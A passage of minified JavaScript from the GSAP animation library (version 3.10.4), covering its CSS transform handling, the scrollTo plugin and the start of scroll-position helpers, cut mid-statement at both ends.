if(nt(e)&&!nt(i)){for(h=[],u=e.length,l=u-2,a=1;a<u;a++)h.push(t(e[a-1],e[a]));u--,s=function(t){t*=u;var e=Math.min(l,~~t);return h[e](t-e)},r=i}else n||(e=Gt(nt(e)?[]:{},e));if(!h){for(o in i)ni.call(d,e,o,"get",i[o]);s=function(t){return xi(t,d)||(c?e.p:e)}}}return de(r,s)},shuffle:_e},install:ft,effects:Tt,ticker:ke,updateRoot:ti.updateRoot,plugins:bt,globalTimeline:S,core:{PropTween:wi,globals:vt,Tween:ci,Timeline:ti,Animation:Je,getCache:Ct,_removeLinkedListItem:jt,suppressOverwrites:function(t){return w=t}}};Rt("to,from,fromTo,delayedCall,set,killTweensOf",(function(t){return Si[t]=ci[t]})),ke.add(ti.updateRoot),O=Si.to({},{duration:0});var Ai=function(t,e){for(var i=t._pt;i&&i.p!==e&&i.op!==e&&i.fp!==e;)i=i._next;return i},Ci=function(t,e){return{name:t,rawVars:1,init:function(t,i,r){r._onInit=function(t){var r,n;if(q(i)&&(r={},Rt(i,(function(t){return r[t]=1})),i=r),e){for(n in r={},i)r[n]=e(i[n]);i=r}!function(t,e){var i,r,n,s=t._targets;for(i in e)for(r=s.length;r--;)(n=t._ptLookup[r][i])&&(n=n.d)&&(n._pt&&(n=Ai(n,i)),n&&n.modifier&&n.modifier(e[i],t,s[r],i))}(t,i)}}}},Ii=Si.registerPlugin({name:"attr",init:function(t,e,i,r,n){var s,o;for(s in e)(o=this.add(t,"setAttribute",(t.getAttribute(s)||0)+"",e[s],r,n,0,0,s))&&(o.op=s),this._props.push(s)}},{name:"endArray",init:function(t,e){for(var i=e.length;i--;)this.add(t,i,t[i]||0,e[i])}},Ci("roundProps",xe),Ci("modifiers"),Ci("snap",Ee))||Si;ci.version=ti.version=Ii.version="3.10.4",R=1,et()&&Ge(),He.Power0,He.Power1,He.Power2,He.Power3,He.Power4,He.Linear,He.Quad,He.Cubic,He.Quart,He.Quint,He.Strong,He.Elastic,He.Back,He.SteppedEase,He.Bounce,He.Sine,He.Expo,He.Circ;var Ri,Pi,Oi,Ni,Mi,Fi,Li,Bi={},Ui=180/Math.PI,ki=Math.PI/180,Gi=Math.atan2,Hi=/([A-Z])/g,zi=/(left|right|width|margin|padding|x)/i,Vi=/[\s,\(]\S/,Xi={autoAlpha:"opacity,visibility",scale:"scaleX,scaleY",alpha:"opacity"},ji=function(t,e){return e.set(e.t,e.p,Math.round(1e4*(e.s+e.c*t))/1e4+e.u,e)},$i=function(t,e){return e.set(e.t,e.p,1===t?e.e:Math.round(1e4*(e.s+e.c*t))/1e4+e.u,e)},Wi=function(t,e){return e.set(e.t,e.p,t?Math.round(1e4*(e.s+e.c*t))/1e4+e.u:e.b,e)},Yi=function(t,e){var i=e.s+e.c*t;e.set(e.t,e.p,~~(i+(i<0?-.5:.5))+e.u,e)},qi=function(t,e){return e.set(e.t,e.p,t?e.e:e.b,e)},Zi=function(t,e){return e.set(e.t,e.p,1!==t?e.b:e.e,e)},Ki=function(t,e,i){return t.style[e]=i},Qi=function(t,e,i){return t.style.setProperty(e,i)},Ji=function(t,e,i){return t._gsap[e]=i},tr=function(t,e,i){return t._gsap.scaleX=t._gsap.scaleY=i},er=function(t,e,i,r,n){var s=t._gsap;s.scaleX=s.scaleY=i,s.renderTransform(n,s)},ir=function(t,e,i,r,n){var s=t._gsap;s[e]=i,s.renderTransform(n,s)},rr="transform",nr=rr+"Origin",sr=function(t,e){var i=Pi.createElementNS?Pi.createElementNS((e||"http://www.w3.org/1999/xhtml").replace(/^https/,"http"),t):Pi.createElement(t);return i.style?i:Pi.createElement(t)},or=function t(e,i,r){var n=getComputedStyle(e);return n[i]||n.getPropertyValue(i.replace(Hi,"-$1").toLowerCase())||n.getPropertyValue(i)||!r&&t(e,hr(i)||i,1)||""},ar="O,Moz,ms,Ms,Webkit".split(","),hr=function(t,e,i){var r=(e||Mi).style,n=5;if(t in r&&!i)return t;for(t=t.charAt(0).toUpperCase()+t.substr(1);n--&&!(ar[n]+t in r););return n<0?null:(3===n?"ms":n>=0?ar[n]:"")+t},ur=function(){"undefined"!=typeof window&&window.document&&(Ri=window,Pi=Ri.document,Oi=Pi.documentElement,Mi=sr("div")||{style:{}},sr("div"),rr=hr(rr),nr=rr+"Origin",Mi.style.cssText="border-width:0;line-height:0;position:absolute;padding:0",Li=!!hr("perspective"),Ni=1)},lr=function t(e){var i,r=sr("svg",this.ownerSVGElement&&this.ownerSVGElement.getAttribute("xmlns")||"http://www.w3.org/2000/svg"),n=this.parentNode,s=this.nextSibling,o=this.style.cssText;if(Oi.appendChild(r),r.appendChild(this),this.style.display="block",e)try{i=this.getBBox(),this._gsapBBox=this.getBBox,this.getBBox=t}catch(t){}else this._gsapBBox&&(i=this._gsapBBox());return n&&(s?n.insertBefore(this,s):n.appendChild(this)),Oi.removeChild(r),this.style.cssText=o,i},cr=function(t,e){for(var i=e.length;i--;)if(t.hasAttribute(e[i]))return t.getAttribute(e[i])},dr=function(t){var e;try{e=t.getBBox()}catch(i){e=lr.call(t,!0)}return e&&(e.width||e.height)||t.getBBox===lr||(e=lr.call(t,!0)),!e||e.width||e.x||e.y?e:{x:+cr(t,["x","cx","x1"])||0,y:+cr(t,["y","cy","y1"])||0,width:0,height:0}},pr=function(t){return!(!t.getCTM||t.parentNode&&!t.ownerSVGElement||!dr(t))},fr=function(t,e){if(e){var i=t.style;e in Bi&&e!==nr&&(e=rr),i.removeProperty?("ms"!==e.substr(0,2)&&"webkit"!==e.substr(0,6)||(e="-"+e),i.removeProperty(e.replace(Hi,"-$1").toLowerCase())):i.removeAttribute(e)}},gr=function(t,e,i,r,n,s){var o=new wi(t._pt,e,i,0,1,s?Zi:qi);return t._pt=o,o.b=r,o.e=n,t._props.push(i),o},mr={deg:1,rad:1,turn:1},vr=function t(e,i,r,n){var s,o,a,h,u=parseFloat(r)||0,l=(r+"").trim().substr((u+"").length)||"px",c=Mi.style,d=zi.test(i),p="svg"===e.tagName.toLowerCase(),f=(p?"client":"offset")+(d?"Width":"Height"),g=100,m="px"===n,v="%"===n;return n===l||!u||mr[n]||mr[l]?u:("px"!==l&&!m&&(u=t(e,i,r,"px")),h=e.getCTM&&pr(e),!v&&"%"!==l||!Bi[i]&&!~i.indexOf("adius")?(c[d?"width":"height"]=g+(m?l:n),o=~i.indexOf("adius")||"em"===n&&e.appendChild&&!p?e:e.parentNode,h&&(o=(e.ownerSVGElement||{}).parentNode),o&&o!==Pi&&o.appendChild||(o=Pi.body),(a=o._gsap)&&v&&a.width&&d&&a.time===ke.time?Pt(u/a.width*g):((v||"%"===l)&&(c.position=or(e,"position")),o===e&&(c.position="static"),o.appendChild(Mi),s=Mi[f],o.removeChild(Mi),c.position="absolute",d&&v&&((a=Ct(o)).time=ke.time,a.width=o[f]),Pt(m?s*u/g:s&&u?g/s*u:0))):(s=h?e.getBBox()[d?"width":"height"]:e[f],Pt(v?u/s*g:u/100*s)))},_r=function(t,e,i,r){var n;return Ni||ur(),e in Xi&&"transform"!==e&&~(e=Xi[e]).indexOf(",")&&(e=e.split(",")[0]),Bi[e]&&"transform"!==e?(n=Ir(t,r),n="transformOrigin"!==e?n[e]:n.svg?n.origin:Rr(or(t,nr))+" "+n.zOrigin+"px"):(!(n=t.style[e])||"auto"===n||r||~(n+"").indexOf("calc("))&&(n=br[e]&&br[e](t,e,i)||or(t,e)||It(t,e)||("opacity"===e?1:0)),i&&!~(n+"").trim().indexOf(" ")?vr(t,e,n,i)+i:n},yr=function(t,e,i,r){if(!i||"none"===i){var n=hr(e,t,1),s=n&&or(t,n,1);s&&s!==i?(e=n,i=s):"borderColor"===e&&(i=or(t,"borderTopColor"))}var o,a,h,u,l,c,d,p,f,g,m,v=new wi(this._pt,t.style,e,0,1,yi),_=0,y=0;if(v.b=i,v.e=r,i+="","auto"==(r+="")&&(t.style[e]=r,r=or(t,e)||r,t.style[e]=i),Ue(o=[i,r]),r=o[1],h=(i=o[0]).match(at)||[],(r.match(at)||[]).length){for(;a=at.exec(r);)d=a[0],f=r.substring(_,a.index),l?l=(l+1)%5:"rgba("!==f.substr(-5)&&"hsla("!==f.substr(-5)||(l=1),d!==(c=h[y++]||"")&&(u=parseFloat(c)||0,m=c.substr((u+"").length),"="===d.charAt(1)&&(d=Nt(u,d)+m),p=parseFloat(d),g=d.substr((p+"").length),_=at.lastIndex-g.length,g||(g=g||U.units[e]||m,_===r.length&&(r+=g,v.e+=g)),m!==g&&(u=vr(t,e,c,g)||0),v._pt={_next:v._pt,p:f||1===y?f:",",s:u,c:p-u,m:l&&l<4||"zIndex"===e?Math.round:0});v.c=_<r.length?r.substring(_,r.length):""}else v.r="display"===e&&"none"===r?Zi:qi;return ut.test(r)&&(v.e=0),this._pt=v,v},xr={top:"0%",bottom:"100%",left:"0%",right:"100%",center:"50%"},Er=function(t,e){if(e.tween&&e.tween._time===e.tween._dur){var i,r,n,s=e.t,o=s.style,a=e.u,h=s._gsap;if("all"===a||!0===a)o.cssText="",r=1;else for(n=(a=a.split(",")).length;--n>-1;)i=a[n],Bi[i]&&(r=1,i="transformOrigin"===i?nr:rr),fr(s,i);r&&(fr(s,rr),h&&(h.svg&&s.removeAttribute("transform"),Ir(s,1),h.uncache=1))}},br={clearProps:function(t,e,i,r,n){if("isFromStart"!==n.data){var s=t._pt=new wi(t._pt,e,i,0,0,Er);return s.u=r,s.pr=-10,s.tween=n,t._props.push(i),1}}},Tr=[1,0,0,1,0,0],Dr={},wr=function(t){return"matrix(1, 0, 0, 1, 0, 0)"===t||"none"===t||!t},Sr=function(t){var e=or(t,rr);return wr(e)?Tr:e.substr(7).match(ot).map(Pt)},Ar=function(t,e){var i,r,n,s,o=t._gsap||Ct(t),a=t.style,h=Sr(t);return o.svg&&t.getAttribute("transform")?"1,0,0,1,0,0"===(h=[(n=t.transform.baseVal.consolidate().matrix).a,n.b,n.c,n.d,n.e,n.f]).join(",")?Tr:h:(h!==Tr||t.offsetParent||t===Oi||o.svg||(n=a.display,a.display="block",(i=t.parentNode)&&t.offsetParent||(s=1,r=t.nextSibling,Oi.appendChild(t)),h=Sr(t),n?a.display=n:fr(t,"display"),s&&(r?i.insertBefore(t,r):i?i.appendChild(t):Oi.removeChild(t))),e&&h.length>6?[h[0],h[1],h[4],h[5],h[12],h[13]]:h)},Cr=function(t,e,i,r,n,s){var o,a,h,u=t._gsap,l=n||Ar(t,!0),c=u.xOrigin||0,d=u.yOrigin||0,p=u.xOffset||0,f=u.yOffset||0,g=l[0],m=l[1],v=l[2],_=l[3],y=l[4],x=l[5],E=e.split(" "),b=parseFloat(E[0])||0,T=parseFloat(E[1])||0;i?l!==Tr&&(a=g*_-m*v)&&(h=b*(-m/a)+T*(g/a)-(g*x-m*y)/a,b=b*(_/a)+T*(-v/a)+(v*x-_*y)/a,T=h):(b=(o=dr(t)).x+(~E[0].indexOf("%")?b/100*o.width:b),T=o.y+(~(E[1]||E[0]).indexOf("%")?T/100*o.height:T)),r||!1!==r&&u.smooth?(y=b-c,x=T-d,u.xOffset=p+(y*g+x*v)-y,u.yOffset=f+(y*m+x*_)-x):u.xOffset=u.yOffset=0,u.xOrigin=b,u.yOrigin=T,u.smooth=!!r,u.origin=e,u.originIsAbsolute=!!i,t.style[nr]="0px 0px",s&&(gr(s,u,"xOrigin",c,b),gr(s,u,"yOrigin",d,T),gr(s,u,"xOffset",p,u.xOffset),gr(s,u,"yOffset",f,u.yOffset)),t.setAttribute("data-svg-origin",b+" "+T)},Ir=function(t,e){var i=t._gsap||new Qe(t);if("x"in i&&!e&&!i.uncache)return i;var r,n,s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T,D,w,S,A,C,I,R,P,O,N,M,F=t.style,L=i.scaleX<0,B="px",k="deg",G=or(t,nr)||"0";return r=n=s=h=u=l=c=d=p=0,o=a=1,i.svg=!(!t.getCTM||!pr(t)),m=Ar(t,i.svg),i.svg&&(S=(!i.uncache||"0px 0px"===G)&&!e&&t.getAttribute("data-svg-origin"),Cr(t,S||G,!!S||i.originIsAbsolute,!1!==i.smooth,m)),f=i.xOrigin||0,g=i.yOrigin||0,m!==Tr&&(x=m[0],E=m[1],b=m[2],T=m[3],r=D=m[4],n=w=m[5],6===m.length?(o=Math.sqrt(x*x+E*E),a=Math.sqrt(T*T+b*b),h=x||E?Gi(E,x)*Ui:0,(c=b||T?Gi(b,T)*Ui+h:0)&&(a*=Math.abs(Math.cos(c*ki))),i.svg&&(r-=f-(f*x+g*b),n-=g-(f*E+g*T))):(M=m[6],O=m[7],I=m[8],R=m[9],P=m[10],N=m[11],r=m[12],n=m[13],s=m[14],u=(v=Gi(M,P))*Ui,v&&(S=D*(_=Math.cos(-v))+I*(y=Math.sin(-v)),A=w*_+R*y,C=M*_+P*y,I=D*-y+I*_,R=w*-y+R*_,P=M*-y+P*_,N=O*-y+N*_,D=S,w=A,M=C),l=(v=Gi(-b,P))*Ui,v&&(_=Math.cos(-v),N=T*(y=Math.sin(-v))+N*_,x=S=x*_-I*y,E=A=E*_-R*y,b=C=b*_-P*y),h=(v=Gi(E,x))*Ui,v&&(S=x*(_=Math.cos(v))+E*(y=Math.sin(v)),A=D*_+w*y,E=E*_-x*y,w=w*_-D*y,x=S,D=A),u&&Math.abs(u)+Math.abs(h)>359.9&&(u=h=0,l=180-l),o=Pt(Math.sqrt(x*x+E*E+b*b)),a=Pt(Math.sqrt(w*w+M*M)),v=Gi(D,w),c=Math.abs(v)>2e-4?v*Ui:0,p=N?1/(N<0?-N:N):0),i.svg&&(S=t.getAttribute("transform"),i.forceCSS=t.setAttribute("transform","")||!wr(or(t,rr)),S&&t.setAttribute("transform",S))),Math.abs(c)>90&&Math.abs(c)<270&&(L?(o*=-1,c+=h<=0?180:-180,h+=h<=0?180:-180):(a*=-1,c+=c<=0?180:-180)),e=e||i.uncache,i.x=r-((i.xPercent=r&&(!e&&i.xPercent||(Math.round(t.offsetWidth/2)===Math.round(-r)?-50:0)))?t.offsetWidth*i.xPercent/100:0)+B,i.y=n-((i.yPercent=n&&(!e&&i.yPercent||(Math.round(t.offsetHeight/2)===Math.round(-n)?-50:0)))?t.offsetHeight*i.yPercent/100:0)+B,i.z=s+B,i.scaleX=Pt(o),i.scaleY=Pt(a),i.rotation=Pt(h)+k,i.rotationX=Pt(u)+k,i.rotationY=Pt(l)+k,i.skewX=c+k,i.skewY=d+k,i.transformPerspective=p+B,(i.zOrigin=parseFloat(G.split(" ")[2])||0)&&(F[nr]=Rr(G)),i.xOffset=i.yOffset=0,i.force3D=U.force3D,i.renderTransform=i.svg?Br:Li?Lr:Or,i.uncache=0,i},Rr=function(t){return(t=t.split(" "))[0]+" "+t[1]},Pr=function(t,e,i){var r=fe(e);return Pt(parseFloat(e)+parseFloat(vr(t,"x",i+"px",r)))+r},Or=function(t,e){e.z="0px",e.rotationY=e.rotationX="0deg",e.force3D=0,Lr(t,e)},Nr="0deg",Mr="0px",Fr=") ",Lr=function(t,e){var i=e||this,r=i.xPercent,n=i.yPercent,s=i.x,o=i.y,a=i.z,h=i.rotation,u=i.rotationY,l=i.rotationX,c=i.skewX,d=i.skewY,p=i.scaleX,f=i.scaleY,g=i.transformPerspective,m=i.force3D,v=i.target,_=i.zOrigin,y="",x="auto"===m&&t&&1!==t||!0===m;if(_&&(l!==Nr||u!==Nr)){var E,b=parseFloat(u)*ki,T=Math.sin(b),D=Math.cos(b);b=parseFloat(l)*ki,E=Math.cos(b),s=Pr(v,s,T*E*-_),o=Pr(v,o,-Math.sin(b)*-_),a=Pr(v,a,D*E*-_+_)}g!==Mr&&(y+="perspective("+g+Fr),(r||n)&&(y+="translate("+r+"%, "+n+"%) "),(x||s!==Mr||o!==Mr||a!==Mr)&&(y+=a!==Mr||x?"translate3d("+s+", "+o+", "+a+") ":"translate("+s+", "+o+Fr),h!==Nr&&(y+="rotate("+h+Fr),u!==Nr&&(y+="rotateY("+u+Fr),l!==Nr&&(y+="rotateX("+l+Fr),c===Nr&&d===Nr||(y+="skew("+c+", "+d+Fr),1===p&&1===f||(y+="scale("+p+", "+f+Fr),v.style[rr]=y||"translate(0, 0)"},Br=function(t,e){var i,r,n,s,o,a=e||this,h=a.xPercent,u=a.yPercent,l=a.x,c=a.y,d=a.rotation,p=a.skewX,f=a.skewY,g=a.scaleX,m=a.scaleY,v=a.target,_=a.xOrigin,y=a.yOrigin,x=a.xOffset,E=a.yOffset,b=a.forceCSS,T=parseFloat(l),D=parseFloat(c);d=parseFloat(d),p=parseFloat(p),(f=parseFloat(f))&&(p+=f=parseFloat(f),d+=f),d||p?(d*=ki,p*=ki,i=Math.cos(d)*g,r=Math.sin(d)*g,n=Math.sin(d-p)*-m,s=Math.cos(d-p)*m,p&&(f*=ki,o=Math.tan(p-f),n*=o=Math.sqrt(1+o*o),s*=o,f&&(o=Math.tan(f),i*=o=Math.sqrt(1+o*o),r*=o)),i=Pt(i),r=Pt(r),n=Pt(n),s=Pt(s)):(i=g,s=m,r=n=0),(T&&!~(l+"").indexOf("px")||D&&!~(c+"").indexOf("px"))&&(T=vr(v,"x",l,"px"),D=vr(v,"y",c,"px")),(_||y||x||E)&&(T=Pt(T+_-(_*i+y*n)+x),D=Pt(D+y-(_*r+y*s)+E)),(h||u)&&(o=v.getBBox(),T=Pt(T+h/100*o.width),D=Pt(D+u/100*o.height)),o="matrix("+i+","+r+","+n+","+s+","+T+","+D+")",v.setAttribute("transform",o),b&&(v.style[rr]=o)},Ur=function(t,e,i,r,n){var s,o,a=360,h=q(n),u=parseFloat(n)*(h&&~n.indexOf("rad")?Ui:1)-r,l=r+u+"deg";return h&&("short"===(s=n.split("_")[1])&&(u%=a)!=u%180&&(u+=u<0?a:-360),"cw"===s&&u<0?u=(u+36e9)%a-~~(u/a)*a:"ccw"===s&&u>0&&(u=(u-36e9)%a-~~(u/a)*a)),t._pt=o=new wi(t._pt,e,i,r,u,$i),o.e=l,o.u="deg",t._props.push(i),o},kr=function(t,e){for(var i in e)t[i]=e[i];return t},Gr=function(t,e,i){var r,n,s,o,a,h,u,l=kr({},i._gsap),c=i.style;for(n in l.svg?(s=i.getAttribute("transform"),i.setAttribute("transform",""),c[rr]=e,r=Ir(i,1),fr(i,rr),i.setAttribute("transform",s)):(s=getComputedStyle(i)[rr],c[rr]=e,r=Ir(i,1),c[rr]=s),Bi)(s=l[n])!==(o=r[n])&&"perspective,force3D,transformOrigin,svgOrigin".indexOf(n)<0&&(a=fe(s)!==(u=fe(o))?vr(i,n,s,u):parseFloat(s),h=parseFloat(o),t._pt=new wi(t._pt,r,n,a,h-a,ji),t._pt.u=u||0,t._props.push(n));kr(r,l)};Rt("padding,margin,Width,Radius",(function(t,e){var i="Top",r="Right",n="Bottom",s="Left",o=(e<3?[i,r,n,s]:[i+s,i+r,n+r,n+s]).map((function(i){return e<2?t+i:"border"+i+t}));br[e>1?"border"+t:t]=function(t,e,i,r,n){var s,a;if(arguments.length<4)return s=o.map((function(e){return _r(t,e,i)})),5===(a=s.join(" ")).split(s[0]).length?s[0]:a;s=(r+"").split(" "),a={},o.forEach((function(t,e){return a[t]=s[e]=s[e]||s[(e-1)/2|0]})),t.init(e,a,n)}}));var Hr,zr,Vr={name:"css",register:ur,targetTest:function(t){return t.style&&t.nodeType},init:function(t,e,i,r,n){var s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T,D=this._props,w=t.style,S=i.vars.startAt;for(c in Ni||ur(),e)if("autoRound"!==c&&(o=e[c],!bt[c]||!si(c,e,i,r,t,n)))if(u=typeof o,l=br[c],"function"===u&&(u=typeof(o=o.call(i,r,t,n))),"string"===u&&~o.indexOf("random(")&&(o=De(o)),l)l(this,t,c,o,i)&&(y=1);else if("--"===c.substr(0,2))s=(getComputedStyle(t).getPropertyValue(c)+"").trim(),o+="",Le.lastIndex=0,Le.test(s)||(d=fe(s),p=fe(o)),p?d!==p&&(s=vr(t,c,s,p)+p):d&&(o+=d),this.add(w,"setProperty",s,o,r,n,0,0,c),D.push(c);else if("undefined"!==u){if(S&&c in S?(s="function"==typeof S[c]?S[c].call(i,r,t,n):S[c],q(s)&&~s.indexOf("random(")&&(s=De(s)),fe(s+"")||(s+=U.units[c]||fe(_r(t,c))||""),"="===(s+"").charAt(1)&&(s=_r(t,c))):s=_r(t,c),h=parseFloat(s),(f="string"===u&&"="===o.charAt(1)&&o.substr(0,2))&&(o=o.substr(2)),a=parseFloat(o),c in Xi&&("autoAlpha"===c&&(1===h&&"hidden"===_r(t,"visibility")&&a&&(h=0),gr(this,w,"visibility",h?"inherit":"hidden",a?"inherit":"hidden",!a)),"scale"!==c&&"transform"!==c&&~(c=Xi[c]).indexOf(",")&&(c=c.split(",")[0])),g=c in Bi)if(m||((v=t._gsap).renderTransform&&!e.parseTransform||Ir(t,e.parseTransform),_=!1!==e.smoothOrigin&&v.smooth,(m=this._pt=new wi(this._pt,w,rr,0,1,v.renderTransform,v,0,-1)).dep=1),"scale"===c)this._pt=new wi(this._pt,v,"scaleY",v.scaleY,(f?Nt(v.scaleY,f+a):a)-v.scaleY||0),D.push("scaleY",c),c+="X";else{if("transformOrigin"===c){E=void 0,b=void 0,T=void 0,b=(E=(x=o).split(" "))[0],T=E[1]||"50%","top"!==b&&"bottom"!==b&&"left"!==T&&"right"!==T||(x=b,b=T,T=x),E[0]=xr[b]||b,E[1]=xr[T]||T,o=E.join(" "),v.svg?Cr(t,o,0,_,0,this):((p=parseFloat(o.split(" ")[2])||0)!==v.zOrigin&&gr(this,v,"zOrigin",v.zOrigin,p),gr(this,w,c,Rr(s),Rr(o)));continue}if("svgOrigin"===c){Cr(t,o,1,_,0,this);continue}if(c in Dr){Ur(this,v,c,h,f?Nt(h,f+o):o);continue}if("smoothOrigin"===c){gr(this,v,"smooth",v.smooth,o);continue}if("force3D"===c){v[c]=o;continue}if("transform"===c){Gr(this,o,t);continue}}else c in w||(c=hr(c)||c);if(g||(a||0===a)&&(h||0===h)&&!Vi.test(o)&&c in w)a||(a=0),(d=(s+"").substr((h+"").length))!==(p=fe(o)||(c in U.units?U.units[c]:d))&&(h=vr(t,c,s,p)),this._pt=new wi(this._pt,g?v:w,c,h,(f?Nt(h,f+a):a)-h,g||"px"!==p&&"zIndex"!==c||!1===e.autoRound?ji:Yi),this._pt.u=p||0,d!==p&&"%"!==p&&(this._pt.b=s,this._pt.r=Wi);else if(c in w)yr.call(this,t,c,s,f?f+o:o);else{if(!(c in t)){gt(c,o);continue}this.add(t,c,s||t[c],f?f+o:o,r,n)}D.push(c)}y&&Di(this)},get:_r,aliases:Xi,getSetter:function(t,e,i){var r=Xi[e];return r&&r.indexOf(",")<0&&(e=r),e in Bi&&e!==nr&&(t._gsap.x||_r(t,"x"))?i&&Fi===i?"scale"===e?tr:Ji:(Fi=i||{})&&("scale"===e?er:ir):t.style&&!Q(t.style[e])?Ki:~e.indexOf("-")?Qi:mi(t,e)},core:{_removeProperty:fr,_getMatrix:Ar}};Ii.utils.checkPrefix=hr,zr=Rt("x,y,z,scale,scaleX,scaleY,xPercent,yPercent,"+(Hr="rotation,rotationX,rotationY,skewX,skewY")+",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective",(function(t){Bi[t]=1})),Rt(Hr,(function(t){U.units[t]="deg",Dr[t]=1})),Xi[zr[13]]="x,y,z,scale,scaleX,scaleY,xPercent,yPercent,"+Hr,Rt("0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY",(function(t){var e=t.split(":");Xi[e[1]]=zr[e[0]]})),Rt("x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective",(function(t){U.units[t]="px"})),Ii.registerPlugin(Vr);var Xr,jr,$r,Wr,Yr,qr,Zr,Kr=Ii.registerPlugin(Vr)||Ii,Qr=(Kr.core.Tween,function(){return"undefined"!=typeof window}),Jr=function(){return Xr||Qr()&&(Xr=window.gsap)&&Xr.registerPlugin&&Xr},tn=function(t){return"string"==typeof t},en=function(t){return"function"==typeof t},rn=function(t,e){var i="x"===e?"Width":"Height",r="scroll"+i,n="client"+i;return t===$r||t===Wr||t===Yr?Math.max(Wr[r],Yr[r])-($r["inner"+i]||Wr[n]||Yr[n]):t[r]-t["offset"+i]},nn=function(t,e){var i="scroll"+("x"===e?"Left":"Top");return t===$r&&(null!=t.pageXOffset?i="page"+e.toUpperCase()+"Offset":t=null!=Wr[i]?Wr:Yr),function(){return t[i]}},sn=function(t,e){if(!(t=qr(t)[0])||!t.getBoundingClientRect)return console.warn("scrollTo target doesn't exist. Using 0")||{x:0,y:0};var i=t.getBoundingClientRect(),r=!e||e===$r||e===Yr,n=r?{top:Wr.clientTop-($r.pageYOffset||Wr.scrollTop||Yr.scrollTop||0),left:Wr.clientLeft-($r.pageXOffset||Wr.scrollLeft||Yr.scrollLeft||0)}:e.getBoundingClientRect(),s={x:i.left-n.left,y:i.top-n.top};return!r&&e&&(s.x+=nn(e,"x")(),s.y+=nn(e,"y")()),s},on=function(t,e,i,r,n){return isNaN(t)||"object"==typeof t?tn(t)&&"="===t.charAt(1)?parseFloat(t.substr(2))*("-"===t.charAt(0)?-1:1)+r-n:"max"===t?rn(e,i)-n:Math.min(rn(e,i),sn(t,e)[i]-n):parseFloat(t)-n},an=function(){Xr=Jr(),Qr()&&Xr&&document.body&&($r=window,Yr=document.body,Wr=document.documentElement,qr=Xr.utils.toArray,Xr.config({autoKillThreshold:7}),Zr=Xr.config(),jr=1)},hn={version:"3.10.4",name:"scrollTo",rawVars:1,register:function(t){Xr=t,an()},init:function(t,e,i,r,n){jr||an();var s=this,o=Xr.getProperty(t,"scrollSnapType");s.isWin=t===$r,s.target=t,s.tween=i,e=function(t,e,i,r){if(en(t)&&(t=t(e,i,r)),"object"!=typeof t)return tn(t)&&"max"!==t&&"="!==t.charAt(1)?{x:t,y:t}:{y:t};if(t.nodeType)return{y:t,x:t};var n,s={};for(n in t)s[n]="onAutoKill"!==n&&en(t[n])?t[n](e,i,r):t[n];return s}(e,r,t,n),s.vars=e,s.autoKill=!!e.autoKill,s.getX=nn(t,"x"),s.getY=nn(t,"y"),s.x=s.xPrev=s.getX(),s.y=s.yPrev=s.getY(),o&&"none"!==o&&(s.snap=1,s.snapInline=t.style.scrollSnapType,t.style.scrollSnapType="none"),null!=e.x?(s.add(s,"x",s.x,on(e.x,t,"x",s.x,e.offsetX||0),r,n),s._props.push("scrollTo_x")):s.skipX=1,null!=e.y?(s.add(s,"y",s.y,on(e.y,t,"y",s.y,e.offsetY||0),r,n),s._props.push("scrollTo_y")):s.skipY=1},render:function(t,e){for(var i,r,n,s,o,a=e._pt,h=e.target,u=e.tween,l=e.autoKill,c=e.xPrev,d=e.yPrev,p=e.isWin,f=e.snap,g=e.snapInline;a;)a.r(t,a.d),a=a._next;i=p||!e.skipX?e.getX():c,n=(r=p||!e.skipY?e.getY():d)-d,s=i-c,o=Zr.autoKillThreshold,e.x<0&&(e.x=0),e.y<0&&(e.y=0),l&&(!e.skipX&&(s>o||s<-o)&&i<rn(h,"x")&&(e.skipX=1),!e.skipY&&(n>o||n<-o)&&r<rn(h,"y")&&(e.skipY=1),e.skipX&&e.skipY&&(u.kill(),e.vars.onAutoKill&&e.vars.onAutoKill.apply(u,e.vars.onAutoKillParams||[]))),p?$r.scrollTo(e.skipX?i:e.x,e.skipY?r:e.y):(e.skipY||(h.scrollTop=e.y),e.skipX||(h.scrollLeft=e.x)),!f||1!==t&&0!==t||(r=h.scrollTop,i=h.scrollLeft,g?h.style.scrollSnapType=g:h.style.removeProperty("scroll-snap-type"),h.scrollTop=r+1,h.scrollLeft=i+1,h.scrollTop=r,h.scrollLeft=i),e.xPrev=e.x,e.yPrev=e.y},kill:function(t){var e="scrollTo"===t;(e||"scrollTo_x"===t)&&(this.skipX=1),(e||"scrollTo_y"===t)&&(this.skipY=1)}};hn.max=rn,hn.getOffset=sn,hn.buildGetter=nn,Jr()&&Xr.registerPlugin(hn);var un,ln,cn,dn,pn,fn,gn,mn,vn,_n,yn,xn,En=function(){return un||"undefined"!=typeof window&&(un=window.gsap)&&un.registerPlugin&&un},bn=1,Tn=[],Dn=[],wn=[],Sn=Date.now,An=function(t,e){return e},Cn=function(t,e){return~wn.indexOf(t)&&wn[wn.indexOf(t)+1][e]},In=function(t){return!!~_n.indexOf(t)},Rn=function(t,e,i,r,n){return t.addEventListener(e,i,{passive:!r,capture:!!n})},Pn=function(t,e,i,r){return t.removeEventListener(e,i,!!r)},On=function(){return yn&&yn.isPressed||Dn.cache++},Nn=function(t,e){var i=function i(r){if(r||0===r){bn&&(cn.history.scrollRestoration="manual");var n=yn&&yn.isPressed;r=i.v=Math.round(r)||(yn&&yn.iOS?1:0),t(r),i.cacheID=Dn.cache,n&&An("ss",r)}else(e||Dn.cache!==i.cacheID||An("ref"))&&(i.cacheID=Dn.cache,i.v=t());return i.v+i.offset};return i.offset=0,t&&i},Mn={s:"scrollLeft",p:"left",p2:"Left",os:"right",os2:"Right",d:"width",d2:"Width",a:"x",sc:Nn((function(t){return arguments.length?cn.scrollTo(t,Fn.sc()):cn.pageXOffset||dn.scrollLeft||pn.scrollLeft||fn.scrollLeft||0}))},Fn={s:"scrollTop",p:"top",p2:"Top",os:"bottom",os2:"Bottom",d:"height",d2:"Height",a:"y",op:Mn,sc:Nn((function(t){return arguments.length?cn.scrollTo(Mn.sc(),t):cn.pageYOffset||dn.scrollTop||pn.scrollTop||fn.scrollTop||0}))},Ln=function(t){return un.utils.toArray(t)[0]||("string"==typeof t&&!1!==un.config().nullTargetWarn?console.warn("Element not found:",t):null)},Bn=function(t,e){var 